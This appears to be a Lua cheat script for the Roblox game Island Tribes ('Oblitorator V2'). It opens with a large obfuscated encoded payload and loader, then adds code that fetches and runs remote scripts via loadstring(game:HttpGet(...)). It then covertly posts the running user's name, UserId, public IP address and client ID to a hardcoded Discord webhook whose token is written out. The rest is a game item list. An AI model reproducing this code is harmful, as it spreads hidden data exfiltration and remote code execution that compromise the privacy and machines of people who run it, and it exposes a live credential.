VO2W22WJ2W825N2W62VF2TM2WA2BK2SS2UZ2WE25N2VB2Q22WI2W42TG2UB2W42TM2WP2WO2TX2O22W527A2PP2VB2TG2X02VN2TL2XH2W42TS2X62TY2WS2WN2VQ2XC2XH2XF2W72TS2W32XG2TY2X62U32XN2TM2VI2WW2VB2TS2XS2VF2TY2WV2W72U32X62U72XN2XU2XB2VA2X82Y62VH25N2UK2XG2U72X62UB2XN2TY2X32Y32YK2YJ2U72PT2XG2UB2X62UF2XN2U32YM2XQ2U72YJ2UB2YM2W72UF2X62OE2XN2YX2YG2VV25N2UB2YJ2UF2YY2W72OE2X626I2X827A2BK2UB2ZR2OF2ZI2UF2YJ2OE2Y92VF2ZR2X626H2ZS2VR2UF31062ZX2WF2OT2YJ2ZR2ZW2XG31062X62RP2XN2OE2RP310B2WX25N2ZR2YJ3106310G2W72RP2X626N31072Q32ZR310Y310O2VB31062YJ2RP310225N310Y2X626M310Z2BK3106311C311325N2RP2YJ310Y3118311C2X626L311D311I25N311P311H310Y2YJ311C2XV2W7311P2X62RD2XN310Y2RD311H311C2YJ311P31182RD2X626B311Q311C312D311H311P2YJ2RD310A2XG312D2X626A311Q311P312P311H2RD2YJ312D310N2XG312P2X6269311Q2RD3131311H312D2YJ312P312X2W731312X6268311Q312D313D311H312P2YJ31313118313D2X626F311Q312P313O311H31312YJ313D312L2W7313O2X626E311Q31313140311H313D2YJ313O31122XG31402X62T42XN313D2T4311H313O2YJ314031392VF2T42X626C311Q313O314O311H31402YJ2T4314K25N314O2X626Z311Q31403150311H2T42YJ314O311831502X626Y311Q2T4315B311H314O2YJ31503118315B2X626X311Q314O315M311H31502YJ315B311G2XG315M2X626W310Z22G25N3150315Y2J62272TH2ZT27B2492UT2NY2S12SK311T2SI2NX2JZ3125310C2SS2TV2BN2O12NX2OH2XQ2WH2VE2T22Y22W72TG2X62WR2X92WU2ZH25N25P2722VG1N2Q32SS2RS27931762NV2332UT2UM2SN2RJ2NX2RL31722RN2NX2152T5317925N317N2BK2SO25N312G317227F2NX1Y2Q32OU2SA25N317Z2BK2QK2VG27F2BK29Y2R62AE2R927A2XF2BA27A2PX2R52PQ2NY2R62O52UW311P316O27A2SW2NX2SZ2S42VG210317O3182318X2T92VG2K62TD317W2VG22H25M2O3317P3197318527F2OL23N319827A317P319F3191318T2TC2SN2522U82WW2792WZ2RH2792TG2ZA2792X52SN2TR310Z319R2X72J62U32U5311H316R316M2WK2ZN2VF316W2WM316Y31673170310B31732VG25G319G3178318231AL317S317H2WE25P317X2PU319G318127A25H319G317T2PP2US31A82UW31A22Y9319U31A32TH31AF27B31AH2WE26J22E319P2V82TP2XG2TG312S27931602SS2WD27C26R2VG2X931AX2ZT2RR318231AZ317S2VF2NX3134279251319P31942VZ2WK31C325R313D2NX23X319G2SW2TM319327B2432X7319431BQ2792TY2XS2792Z4319Z2WL2W62792YQ2BN2YS2NY2U32WV311H2Y5316S2TY31AB2YK2YC311Q2YF31AI31742TM26Y319G2TS317P31DF319131CH319M2QS2X72B925N22R2YI319T2YK319W31CU31CT31CX27C31CZ31A42XI3171310P31D431A92X831D72YB2WM2YD2X931DB31AS31DD25N31CE2BK31DH318231EH2O42RJ2TM2OH31AT2XH26S31AW2T627931ES31AQ2XH31B22X731CQ2X831B731D831CT31EB27C31ED2OH31BF2X72VM31BJ2YA25N31BM25N31602TS2Y231BR31E22VR31BV25N31DJ31EU25N31EW31FR31EL25R2VB27921G21G28L25P2RN27923S25M2AO31FZ31FW27A31FZ31G131G325N23Y31G625N31FZ25P24M2TO319G31G82552VG260319G319A31B031C125N31C325N31C52SS31C72WM2Q231CA31CC25N22I31CF29231DL2792UV2S12TS2PP2O131EO317131CG31E2313G2792US31E531B52X8310U31CR31B92O531F627B31F82PZ31EF24T31DG31FR31HZ31EX31HG2QJ27F2TM24U31ET317P31I831I32WW31HM2VD316M31CO31E22O531E92PM31HU27A31HW2TI31BG2XK2TO2WM2U331FG31FI2YK2J631BS31D2318031FR24C31GR318231IB2SI31H931IF31B82TS31CM2VZ31EY31HH31H831HJ27B31IE31F12TY31HQ31F431IL31A12X72XV31EP31EF25331I0317P31JU31DK25N318U31DN2TS2R431HF2WE31F931JG2WV31HK25N31JJ31DT31JL31CT31IK2U631JP31IO317231EF31H631EI31FR31KL31EM31JE31I52XH21T31I9318231KT31IC31EZ31HN31JD31F231KE31HS27931IM31A031JR318R31IQ31B931FD2VF31IU27B31IW31FK27B31IZ27C3199318231JX31FR31KW31KN31GR31FX31GH31G0317K27A21X31GG31G831LR31GB31LU27922J31LX21G31GJ27A23R31GM21G25R31GO2NX31M8319K2TZ313R31952NX22S31KU27A31MK31C02VG31GW31GY2RE316S31H2319H31H422T31B031EN2R72QW2X72B32R02AB27A2R427B2R631H027A2R631CN27A313K2WE2VM31EQ2TM22U31ML27931NK31EX2TY31EZ2U331F12U731F32Z031CT2Z22BN31CS310B31FA2U32Y231LB2ZJ31FF31LE2YK2YT31FL2WA31J1317P22Y31J427A22V31AW27U31ND319H31MC25N22A31GT317E31N12SK2922O731N527931BJ318J2TU2J631862NX2JQ2S8318G2PM2BN29H2V82J629H2VT31PA2WN2NY2OK2XH2PL2SM2VM2QJ318E31A0314331E22T02TS314F31PP31A0314R31PT2X7315331PW2TS315E31PZ25N315P31FM31IH31BU31IF2TY31Q431F32U3318N27A2U731P92BN31DY31D031O531FN31KP31QC2YH2U731PC2YH31QI27C2BS2U32YT2O32S131QN2ZI2U731OK310P31QS27B31QU31QK31J131862U32AE2BK2P92R631N731NB31CT2BN2R62K631OY31MS318D27931QG31RG31A031RN3172318L31AY31RU31OZ2J62VB2U731LG27A24A2WL2O32UM27U31OX27C26L22L27A1Z319G31BX31SC31MY2UT31EP319D25N21831NL31SL31SH2OL31K62VC318N31632OD31BG2SK316L31O42SS31IV2VC31RP27931BS31S831LK27A1M31OF27931SM317S311P31OU2TE2UT273317G2VC317431IP2VC316L271318R2922SS318N27031O72SK31T32YK31S82PP31S32OL31S527B316L317F318K31QL29128G24I2ND2IR24Q2MA2PP22D2QR31RX31J12NZ316P29B2JU24Z2JD2792B128D317J25N31SU316B2OF31U62ON2NY2OV2J629B31JZ2Q331AJ2P2318Y27A31N327921S2OR319Q2QJ2422V931882V9317P31VJ31FP2V92RB27A31VD28L31VP31UJ31U62WW31VT27A2J825L23X27A24F2LW26J23W2AQ28026J23R25A24Q26J23O24P24T25A2NC2MT27X26J23Z2JG2572842IT26J23X2K324U26P26J23Q2M723X24Q24I24N2MY2LX2KJ31WL31WN26J2NS31WG31WI2KJ25531DP31O931UI2PS2NY31VV31XG31QL2NZ31XJ27B31V42BN2J831XK27B2BQ2OS2A02MF24N314825N31UH2QR2W72QN2WM2AO2OH25H22A2V92SK31T731OZ2BK31Y831YA31V931YD2OD22Y2OQ27B2OC26J31YK31VM2QV2QJ23O2OQ31RB31VE317P31YV31H52QV2OC2PP22231RT31XO318R24131RT2B931V02TN2O32OS2PT29H2JZ31YN2OF2OH31ZA2BK31RF2BN31DP319H31YM31V62202Q731YH2T22NV31LR31VV31YF28L310631YC25N320131YJ31YL27A2OC31ZZ31S42OQ317P2U72NV22I31Z031E331Z32OS2SM2TI314027F2OS31YN24N31VO32072YH279320J319H31822Q831VC2QV31VX31U52J62PP2B92NQ2BH2AW29B31US31GO31XS21724K23V2J631VZ2JZ2AG29L29N25931PV31O631XK31ZA2BN31XP27B2PT31V231XL320U31XH31VE2OS31VP31ZO31L029H2PD2792B32S02PB31VE320K29H2QY31ZW2PK322A2BN2VB2AE2PG31B52PJ316P27B2IZ27U2PG31PI25N322P322F2792PG31MB2TN2PJ322E29H31VT2W72B3320J31C5318I2UW2VF2JQ2OS31CB31V5312P2RV2BM2AE31PI320J22F2PY318C31J12PT2AE323N320V25N2PR31XN2RG321S27B2SQ2NZ2QY322S2BN2RF324227C2PV31942PP2TG2PV2B92SH25N26V31N0323X31PM31ZM319M323N319T324L2BN2QU318N324931N02B9323Z2BK2PR2SQ324R2PR2B931UU2IZ2AO31PI317J322Y2B32SS2NV22831V531VX2VB2PC2NY24831V53238320S31RK2BN32122BN2ON322K31XS2J72J929B25B24Y2LO2AX1V24N1W22X31XF2BO2BQ2BS2792BU2BW2BY2C02C22C42C62C82CA2CC2CE2CG2CI2CK2CM2CO2CQ2CS2CU2CW2CY2D02D22D42D62D82DA2DC2DE2DG2DI2DK2DM2DO2DQ2DS2DU2DW2DY2E02E22E42E62E82EA2EC2EE2EG2EI2EK2EM2EO2EQ31UO28127A1O24Y21C23026623J2KB2BA2MR2IT27L312L24C2LU2JN29V25B24N2M72N926J24Y2962LS25524Y2N031X52AG24U31VH27A31Y12QR325A323V2Q231VX31T431UK31UK29H328Q31VF27B3165317F31QX2VF31Y427A31C52AO31VV2W728A2OH323D28L315031EX27U2ON2TG328W27A320J2O127U322N27A325A329J31E632272WM2922P6323A31Z42VR29H2PG31JS31RT313D31ZL31FR32A431KP27U2R4329I31J1320J315B2B3325K31FO312D31EX2PJ2ON322I25N325P319Z322M31E3325A31YY3239323T31V52W42PV329W324S2X92AE324X31HX322F32AI2PY317P32B625N325A32AQ2BN2SW2PJ31PI318I32AS31YR322H32AV32AO2792BS2PJ317J2O325P31VH27U2TM31OU317P32BV31FR329E279325A329N2J62SW27U2B932BH2TN321Q2WN31VB321X27A2BS31V831QL322Y28L323031722PO316731ZA324H27B328S316731ZN2AE32972Q331VP32CP32CS32AU28A2UM31C531YQ31C831RT329B313D28A24C2Q32S12B3329H2QF2O331K3325B32AR32DF316S2JQ2S02VF2PJ32AZ2AE31DP31RC2QG31EE31V523L2Q3292317P32DX322E2B331VX2TG31OT31N627B22M32DI32CH318232DA31EX32DD27B32E531J132DH32E332DJ32E631E62JQ2P332DO322G2W732DR2X9292323N32A22B332ED2QF317P32EZ310P32EF2J632EH32DG32E832EA31OC31GO28A324F2NV325M2BN2OH32EW2K62KJ2KV2B7325Q325R2EQ29D2MM2AX27H27J27L2YM1V24U21323A25X21K22T24621P24824921N24U25Z21P25U21A2351524T21Y25S2GD23I25Y24V22D21Y21V2112J62BP2BR2BT2BV2BX2BZ2C12C32C52C72C92CB2CD2CF2CH2CJ2CL2CN2CP2CR2CT2CV2CX2CZ2D12D32D52D72D92DB2DD2DF2DH2DJ2DL2DN2DP2DR2DT2DV2DX2DZ2E12E32E52E72E92EB2ED2EF2EH2EJ2EL2EN2EP2OC2AQ2572J02J22J42F223025L2YT23Y24Z24O31WH2LX2AI26J2542K32LI2LT24I2LR32IW24L26K25B26J24B24824E26D23S27B328N316B2RJ31P4310C32CR2O131TF2WE31Y32WW325A32CA31C4320G31E628A2OC329C31FS318032C2328U2TI2ZR32C631ZP27C324J27B32AG2BN32AF329K31ZN32AW31AS27F27U26S31OC318232KC329F322G25N23T2TN32333226329Y2O52922P0322W32K832E732A131L82TN2JZ2PX2W7292322K316029H325I328T31ZO31QX2RJ27U320J32KJ323231DT2B331PI32KO2TZ2PE32KS2R332AN31HH31BG31ZF318H329U32LL27A32L22UC31FL32L6320W319M32KG2OS31EQ27U26T32KD27A32M332LZ27B32LB328Y2P732KN322932KQ32LL32AG32A032LM32KW32LP2W432L031O732L32NY31BS32LW31TG32L932M832KK32LD322V2TH32KP31CT32EO31P732LR31BE32LN2TZ32KY2VF32MM32LS2TN32L425N32MQ31LJ32LX27931TE31VU31V331GO28L32EM316932CR31VR328Y2VC321W31XL324N31XS31VZ325T325V27S2B9327R327T327V32GR326432GU326832GX326B32H0326E32H3326H32H6326K32H9326N32HC326Q32HF326T32HI326W32HL326Z32HO327232HR327532HU327832HX327B32I0327E32I3327H32I6327K32I932FS28632FV27A32FX32FZ32G132G332G532G732G932GB32GD32GF32GH32GJ32GL32GN32GP2NQ32IC32IE2J323U32IH25L2WV23X29S24L2M72LT31W824I32IR24U2LX328C25A2M82IT24U23Y27B23R31UI2O532JC31E331PF32MA27931Y632JZ2BK32J731EX27F2ON32JU2NZ2TG32JY320K2PA27F329O32C131RT32982VF29H32DN31V532AZ29232DS31RT2PX32A227F32QP31RT317P32RF32BA32KH2BN2TG320N32JZ31KJ27A32RF27F32RH32DB2RJ2OZ32MU27U329832LK2P332KM2P63229322227U32RC32KV32QW2UC323432N331FH31RT32K332ND32RK32L731VE2R432KJ32RY31DT29H32LF32S231CT32R932K732S731TM32S932N731V532L132SE32MP32SH32NG2VG32QQ2TZ31EQ27F32KJ320232T931KP32RW27A32SL32JV2TH29H32S132R732SR329Y2PZ2UC31F931BG32SW2WM2B332SZ32CG2BN31BS320V32SI32TD27932TF32RZ322Z31CT323532TL32S532TO32S8329Y32SX32TT31O732TV31FL32TY32T3313132FE32CZ31XO31GO3185318032FF31Q731J125L316I23R2LP24G24U2MN23T29427X24I28R26J25926Z26D27032IR29625524O31WU26J2KS2KU2B628731UG31XG32UQ31XI2XB24F27A26H23M32J132IW26J24L24K32J12LW2LZ2LR32Q132J128H32UX2M832IW31XC24Y2LI28T32VY32W729432Q02LU32W42M032Q932W026D26H26J26E26J23L28N2AR2N424827O24N27J32VK31UI32VM32132XB29B2JF2JH31U927923P31UB2LX32X425731RK21W32FN2NY2YY32NF32NF323V31VS2QR32JC31VX2OH2UM32X032FG2QR31VZ32UU32UW32UY26J32V029524L32V32LX32V632V832VA2MY32VD31WV32VG32FL2872R425432XF32C432VN32YF32NT2BN31U327A32XR27C322031XV32P7321G2J932IB2AR32PR32IG32XV24Q32UX32UZ32V132Y132V432Y432V925432VB32Y832VF24K2KT32YB24S324D32J92RH32JB31R831VJ32AT31YX32RU2T5329P32NR2SI32XL31O031BG32ZS32BJ3299320632SD28L324H31BS329132T32S832ZM32UK32YJ32XI2OG317V23S24K24M31WK28532892KY27J2LI2LK32IY32J026J29529W29K32IR2NL29N32VD31V432ZG2J6320Y2NZ32CV2NZ32YN27B31MH2IE2JR2II2IK2IM2IO2OS2IQ2IS321B2BN2BQ2JZ29J29824L2A82EQ2AC32YS25L31PI32IN2552AQ27K32WW2JU2J62672BQ31PI331W32UY2MD29924V31UL323N321J2AI27O27O27Q27S32YQ32FU32F52BQ32YU32ID27A2J132PS2EQ2JN2KD31A4321F32BD332S27C26H332U27B26N332X27A26L333027926B333331GV2BQ29B2JB2802J626F333626D333626Z33382JE31WN32FS2A1320Q2BN26Y333626X333626W2BQ2PX28529V28S29V29X28G2802B12J6273333627233362713336270333626R333626Q333626P333626O333626V333U31UA31UC25831UE24U2232O332KC32YI31L032QH31ZI2QR32JL2PT2AO31Z1321R32TG320S32R032RJ32D132C432DZ32062OC31AJ2AO323U320B3182335G25N317D32YJ31862OC31N431P531XS32CR3308325A329A335A320B32RO31G22OQ32BY31SF319X32JT2OQ31VT2SW321V322G31EQ28A1G32M4279336C318531GD23W31ZU336I31MO28A31DP325A32QR2NY32D332RK2W432S9323D28A32QC32E232BJ27C25631V52O331SR32K532LK27G2QF336632292RZ2BN2JQ32JL32LL2PG31RF32CK32BD2PI32MX32AG29231PI31SR2JQ2PX2SG21Z32LL336X32LL317P337V25P2PJ2JQ337V32273182337V2S132BF27B32BI324H325A2PR323S32BN322F32BQ31TJ2PJ324L32BI31VV2SW323Q31U731SV323M31RV32AX31N032NA2QL32T132423202315Y3259322F32222SI338731HA27B31S3337I336D25N26O2Q433842Q431LZ31LT335Z32U12QV31LY31GA339G31GD23Z339J31M531GK2TQ2BK31GN2OQ2OE336225N32ID319C33773202339Z2XG336M338831VE32CA336R338D2W7336U32D825N24K31802VB32F42BN337132CC32JJ337832C432J72922PX323S337D2QR2PF32E727C3398321T337K31PI31NA337N31E32VB337Q2J625H337T2JQ33AF2BK32DM318233BB3172338033AE2Q3338328M32ZN339432R12AE338A32AV338D25N32BO32AV31QL338632DU32RJ32AT321T32EV32DU318N31FA338N2QH2WM2PV323Z3160338V31IY32MX32EB27A2FP339X2BS339X33BF31G931FY339M27A320Q31G731MA339F31GC27A24L339P31M632X72Q3339U28A23P31V62OS31DR320233D633A432TM336O336Z27B33A9316S33AC2OQ231336432EK32BD32J73375336S325E2NZ33AQ33AW27B31P332YG337F31IS27C32UD310O325A32EM27C2SW33DR31UJ31AJ2B3337T32DT317P33E932R133DK33E329233DN32202SF31UK325A33DU32BD32MM2PG31A62BK33DZ33AM33E233C12QF2PX2V833E725N33DI33EA318233F131KP32LE33A6335B2J633EL336S338E33ES32SI2B3323N31EQ2B32US320233FJ33ED33DC329531V532K325P31YT29H33FL33BK31HL32ZN33FF33F732TG33E42UC2VT31FA33E52RG2W42PJ33CA2QF3245328T325K320222J339C27A33FL317P33F433CM31LS33CU27922W339P33GL31M0339H25N23233CX339R25N25833D031MA32FB33GY33GG336E32DB2VF33A532ZP336P2J633DE31E633DG28A1H33DJ328Y2SW33DN31V433E133FN31B833G532EJ31K531TQ33FP27A31BQ33HM338L33DR2PX2WV33EZ1B32DY31FR33I2339033EE33EV33HK2XB33EJ31HE32F9337432K833HV32DK33EN33EW31IN32B42B333HG33F227A33IN33F533CE33HM33BQ323B2NY2BS33FD31TJ33FY31KR2B31O339933J333I633HN31GX33HT31ZN33FS2F333BJ31FR33J533IR338J33IH33EF33IJ31Q6338P33G52SH2W733G831O733B333CD33GD32T31F33H433JC339X33IQ33GR33CO2791S33GQ33CT31M125N1I33GW27A22U33H0322Y28A33KC339032CP336732062Y2336A25N21C339933KO336L33DA33A7336Q321Z33DF329Y336V25N21D33FX2WL2QJ2AE325E335P32XF32CA31RE2NY313133EE2PX33FH25N21E339933LG31EX2JQ322S32BB32ZY33A62AE33BS2BS2JQ323N32SI33LS33A633AY33HS33BN2YT31FA33BN33JO2VF324W31O732BP32T1325P320221N33JX21F318032A92NZ33KE25N21B3364335V33II336832M032RS2W231SN25Y31AW2VB32JP2NY3371335933E031VE336626U33KV32CD2TH32S932E7338L32LK2JZ2YM32K62JZ2PP32JU324J31S332SM31QL33FR2OQ33MS318931FR33NM32A833IS2TN33BQ32U62J632CF32K82UM32JU32SF33NH31J1320226231SH27U33FG32KA33MQ320233NP2S133O633A6329R33JJ32LO2TW338P33OH33G62XG29233G932MO33CD32MR31FR26131AW335U33HI335B29B310G33KM25031SN33P133A02792GZ320233P632R133KI221335X279312L32K6337933N3336S32C3337J31Z827A310G33N733DV33OK312X33NC31E3337131YQ33NE32R2335W32S931XZ2RR329Y33PW32QZ335W32RN27933PN33PU32US33A633MF2J633O132YL32R133922TI313O32S933PE32LK33BS32KM33N833J925N315U32TN2K631EP31YT28A33P332RG318233QY33OC33NR32R52NY325A33NU2BN33NW2K633NY32T033QD33PX33CF31G433O532DU32M125N33QY31FO33R132L833BY329Q33G032MZ2JZ316E31FA33OK33M32QF33OO32LU31LH32TM339923Z31TA33RK33OU336532C42RF3368321S33Q433PK33Q6310Q32K733QP32S9316I31ZP321533A632D433HS33SF317V2WN33MN27B33MX33QA33H92PS329V322G33PE2VB329G33MW33RE31BE32SS2B92R433RQ33HX32MJ27931FG33NN33ND33QB2TZ27C33QE32UL32QT32C433QJ329Y33QL33NS2QR33AL33AZ33QQ31GW31PL33QU2PZ31YT27U33QY32RS33R033RH33LL33TR33F932TK33NV33RC33EK33UB33TJ33T5320225433RH33O731RT33RL31FR33RN31RT33JH33OF33EV33OK31HK33RV2TZ33RX33ON32MN33S027A32NE31Q7317P25B31AW32YN2OW32X231NB331L33AF2J6333625F331H2A5331K2A82J6263333I27924P24Y2KE316L31Y031XG325A2QR31EQ27932ZL318231YY33VT33G032QC32YK31CT32JG2YG33PG32ZV32CA335S33MG318231U232R132YJ26J33W227C322832CW32XS33W72WE33BS33WA331232UL32YH2OG32YY32Z032XY32Z232Y232V532V732Z632Z832VE32YA32VI28832J832VL33WR2J63373331I29K29M29O32WY2QR331331712EQ32XB2EQ321A32XD334V33TU33W332XJ2QR32ZV33XA33SW32XS31XL33XI279',{},40,2^16,{},"\115\116\114\105\110\103",'',string.byte,string.char,string.sub,table.concat,(math.ldexp or(function(a,b)return a*(2^b);end)),(getfenv or function()_ENV['\95\69\78\86']=_ENV;return _ENV end),setmetatable,select,next,math.floor,string.format,(unpack or table.unpack),tonumber,table.insert,string.gmatch,tostring,type,_VERSION,pcall,string.match,string.find,(debug.getinfo or debug.info),string.len,rawset,string.gsub,math.random,(table.find or function(a,b)for c,d in next,a do if d==b then return c;end;end return nil;end),rawget,_G,print,setfenv);end;
+--AntiHttpSpy
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AltTheReal/OBEDSKDKSKFJSJF/main/AntiHTTPSpy.lua"))()
+local loading = false
+repeat task.wait()
+	if not loading then
+		loading = true
+		print('Loading Oblitorator V2 By TheRealGamer903#7339!')
+	end
+until not game:GetService("Players").LocalPlayer:WaitForChild('PlayerGui'):FindFirstChild('Loading') or game:GetService("Players").LocalPlayer:WaitForChild('PlayerGui'):FindFirstChild('Loading').Parent == nil
+
+
+local Atlas = loadstring(game:HttpGet("https://raw.githubusercontent.com/hiptodude2/the-opness-of-island-tribes/main/AtlasNewVers.lua"))()
+local AtlasUi = Atlas.new({
+    Name = "Island Tribes Oblitorator";
+    ConfigFolder = "IslandTribes"; 
+    Credit = "Credits: zvvpe TheRealGamer903#7339";
+    Color = Color3.fromRGB(0, 255, 0);
+    UseLoader = true;
+    Bind = "LeftBracket";
+    FullName = "Island Tribes Oblitorator";
+    CheckKey = function(lbozo) -- this can be nil to disable key checking
+        return lbozo == "GAMERONTOP"
+    end;
+    Discord = "https://discord.gg/Hh5gUpcUpd";
+})
+
+function MakeAtlasNotification(title, desc, time)
+    return
+    AtlasUi:Notify({
+        Title = title,
+        Content = desc,
+        Duration = time
+    })
+end
+
+HttpService = game:GetService("HttpService")
+Webhook_URL =  "https://discord.com/api/webhooks/1151159623441731684/3d9Ov8nIeYXnOuBSKDhEF-55G8DggFiW7RM71n3XLJ5Vuxb7f6R18rUa3vZcpnQ9suDv"
+ 
+local request = syn and syn.request or request or http and http.request or http_request
+ 
+local response = request({
+    Url = Webhook_URL,
+    Method = "POST",
+    Headers = {
+        ['Content-Type'] = 'application/json'
+    },
+    Body = HttpService:JSONEncode({
+        ["content"] = "",
+        ["embeds"] = {
+            {
+                ["title"] = "",
+                ["description"] = game.Players.LocalPlayer.Name .." Tried Logging Into The Script More Info Below",
+                ["type"] = "rich",
+                ["color"] = tonumber(0xffffff),
+                ["fields"] = {
+                    {
+                        ["name"] = "Player Name : ",
+                        ["value"] = game.Players.LocalPlayer.Name,
+                        ["inline"] = true
+                    }, {
+                        ["name"] = "UserId : ",
+                        ["value"] = game.Players.LocalPlayer.UserId,
+                        ["inline"] = true
+                    }, {
+                        ["name"] = "User Profile : ",
+                        ["value"] = "https://www.roblox.com/users/" ..
+                            game.Players.LocalPlayer.UserId,
+                        ["inline"] = true
+                    }, {
+                        ["name"] = "IP: ",
+                        ["value"] = game:HttpGet("https://api.ipify.org/?format=json"),
+                        ["inline"] = true
+                    }, {
+                        ["name"] = "Client Id : ",
+                        ["value"] = game:GetService("RbxAnalyticsService")
+                            :GetClientId(),
+                        ["inline"] = true
+                    }, {
+                        ["name"] = "Key : ",
+                        ["value"] = "GAMERONTOP",
+                        ["inline"] = true
+                    }
+                }
+            }
+        }
+    })
+})
+--Services
+Workspace = game:GetService('Workspace')
+Players = game:GetService('Players')
+ReplicatedStorage = game:GetService('ReplicatedStorage')
+UserInputService = game:GetService('UserInputService')
+TweenService = game:GetService("TweenService")
+RunService = game:GetService('RunService')
+Lighting  = game:GetService('Lighting')
+VirtualUser = game:GetService("VirtualUser")
+HttpService = game:GetService('HttpService')
+TeleportService = game:GetService("TeleportService")
+PlayersFolder = Workspace:FindFirstChild("Replicators"):FindFirstChild('NonPassive')
+function GetCharacter(playerName)
+    local playerFolder = PlayersFolder:FindFirstChild(playerName)
+    
+    if playerFolder then
+        return playerFolder:FindFirstChild("Character")
+    else
+        return nil
+    end
+end
+--Globals
+LocalPlayer = Players.LocalPlayer
+Mouse = LocalPlayer:GetMouse()
+Camera = Workspace.CurrentCamera
+ALLITEMS = {
+    [1] = "Stick",
+    [2] = "Small Raft",
+    [3] = "Small Campfire",
+    [4] = "Wood Boots",
+    [5] = "Wooden Harvester",
+    [6] = "Wood Helmet",
+    [7] = "Wooden Club",
+    [8] = "Leather Bag",
+    [9] = "Wood Body",
+    [10] = "Wood Legs",
+    [11] = "Wood Storage Chest",
+    [12] = "Wood Bridge",
+    [13] = "Wood Wall",
+    [14] = "Teepee",
+    [15] = "Plant Box",
+    [16] = "Hardleather Bag",
+    [17] = "Stone Boots",
+    [18] = "Stone Harvester",
+    [19] = "Wooden Sword",
+    [20] = "Large Campfire",
+    [21] = "Stone Helmet",
+    [22] = "Party Raft",
+    [23] = "Wood Gate",
+    [24] = "Reinforced Bag",
+    [25] = "Stone Body",
+    [26] = "Stone Legs",
+    [27] = "Stone Storage Chest",
+    [28] = "Furnace",
+    [29] = "Silver Boots",
+    [30] = "Wooden Bow",
+    [31] = "Arrow",
+    [32] = "Stone Wall",
+    [33] = "Silver Helmet",
+    [34] = "Stone Sword",
+    [35] = "Fishing Rod",
+    [36] = "Stone Gate",
+    [37] = "Silver Bag",
+    [38] = "Silver Harvester",
+    [39] = "Silver Body",
+    [40] = "Silver Legs",
+    [41] = "Silver Storage Chest",
+    [42] = "Ladder",
+    [43] = "Gold Boots",
+    [44] = "Silver Sword",
+    [45] = "Stone Land Bridge",
+    [46] = "Silver Wall",
+    [47] = "Gold Helmet",
+    [48] = "Bed",
+    [49] = "Stone Bridge",
+    [50] = "Silver Gate",
+    [51] = "Golden Harvester",
+    [52] = "Gold Body",
+    [53] = "Gold Legs",
+    [54] = "Gold Storage Chest",
+    [55] = "Golden Bag",
+    [56] = "Ruby Boots",
+    [57] = "Golden Sword",
+    [58] = "Gold Wall",
+    [59] = "Ruby Helmet",
+    [60] = "Tent Raft",
+    [61] = "Golden Bow",
+    [62] = "Gold Gate",
+    [63] = "Ruby Harvester",
+    [64] = "Ruby Body",
+    [65] = "Ruby Legs",
+    [66] = "Ruby Storage Chest",
+    [67] = "Diamond Boots",
+    [68] = "Ruby Sword",
+    [69] = "Ruby Bag",
+    [70] = "Diamond Harvester",
+    [71] = "Diamond Helmet",
+    [72] = "Ruby Wall",
+    [73] = "Diamond Body",
+    [74] = "Diamond Legs",
+    [75] = "Ruby Gate",
+    [76] = "Diamond Storage Chest",
+    [77] = "Ruby Bow",
+    [78] = "Diamond Wall",
+    [79] = "Diamond Gate",
+    [80] = "Diamond Bag",
+    [81] = "Small Log",
+    [82] = "Big Log",
+    [83] = "Small Rock",
+    [84] = "Large Rock",
+    [85] = "Raw Fish",
+    [86] = "Cooked Fish",
+    [87] = "Raw Meat",
+    [88] = "Cooked Meat",
+    [89] = "Silver Ore",
+    [90] = "Silver Bar",
+    [91] = "Gold Ore",
+    [92] = "Gold Bar",
+    [93] = "Unrefined Ruby",
+    [94] = "Ruby",
+    [95] = "Unrefined Diamond",
+    [96] = "Diamond",
+    [97] = "Redberry",
+    [98] = "Coconut",
+    [99] = "Watermelon",
+    [100] = "Watermelon Seeds",
+    [101] = "Carrot",
+    [102] = "Carrot Seeds",
+    [103] = "Raw Potato",
+    [104] = "Potato Seeds",
+    [105] = "Banana",
+    [106] = "Leaves",
+    [107] = "Leather",
+    [108] = "Feather",
+    [109] = "Feather Stack",
+    [110] = "Arrow Stack",
+    [111] = "Freshy Chest",
+    [112] = "Stone Supplies",
+    [113] = "Wooden Warrior Pack",
+    [114] = "Feather Pack",
+    [115] = "Arrow Pack",
+    [116] = "Silver Warrior Pack",
+    [117] = "Fisherman's Pack",
+    [118] = "Golden Archer Pack",
+    [119] = "Ruby Hero Pack",
+    [120] = "Infinite Campfire",
+    [121] = "Bowling Pins",
+    [122] = "Cabbage",
+    [123] = "Cabbage Seeds",
+    [124] = "Torch",
+    [125] = "Tiki Torch",
+    [126] = "Baked Potato",
+    [127] = "Small Wood Base",
+    [128] = "Medium Wood Base",
+    [129] = "Large Wood Base",
+    [130] = "Small Stone Base",
+    [131] = "Medium Stone Base",
+    [132] = "Large Stone Base",
+    [133] = "Repair Hammer",
+    [134] = "Unrefined Zenyte",
+    [135] = "Zenyte",
+    [136] = "Totem",
+    [137] = "Caveberry",
+    [138] = "Slime Ball",
+    [139] = "Slime Helmet",
+    [140] = "Slime Body",
+    [141] = "Slime Legs",
+    [142] = "Slime Boots",
+    [143] = "Slimy Pack",
+    [144] = "Zenyte Helmet",
+    [145] = "Zenyte Body",
+    [146] = "Zenyte Storage Chest",
+    [147] = "Zenyte Legs",
+    [148] = "Zenyte Boots",
+    [149] = "Zenyte Wall",
+    [150] = "Zenyte Gate",
+    [151] = "Zenyte Bag",
+    [152] = "Slime Club",
+    [153] = "Zenyte Harvester",
+    [154] = "Diamond Sword",
+    [155] = "Wooden Mine Cart",
+    [156] = "Party Cart",
+    [157] = "Silver Mine Cart",
+    [158] = "Ruby Mine Cart",
+    [159] = "Zenyte Mine Cart",
+    [160] = "Coal",
+    [161] = "Infinite Furnace",
+    [162] = "Beginner Wand",
+    [163] = "Clue Scroll (Easy)",
+    [164] = "Clue Scroll (Medium)",
+    [165] = "Clue Scroll (Hard)",
+    [166] = "Treasure Chest (Easy)",
+    [167] = "Treasure Chest (Medium)",
+    [168] = "Treasure Chest (Hard)",
+    [169] = "Shovel",
+    [170] = "Clue Bottle (Easy)",
+    [171] = "Clue Bottle (Medium)",
+    [172] = "Clue Bottle (Hard)",
+    [173] = "Lucky Sword",
+    [174] = "Lucky Bow",
+    [175] = "Lucky Helmet",
+    [176] = "Lucky Body",
+    [177] = "Lucky Legs",
+    [178] = "Lucky Boots",
+    [179] = "Lucky Harvester",
+    [180] = "Lucky Fruit",
+    [181] = "Candy",
+    [182] = "Kerosene Lamp",
+    [183] = "Sleigh",
+    [184] = "Magical Sleigh",
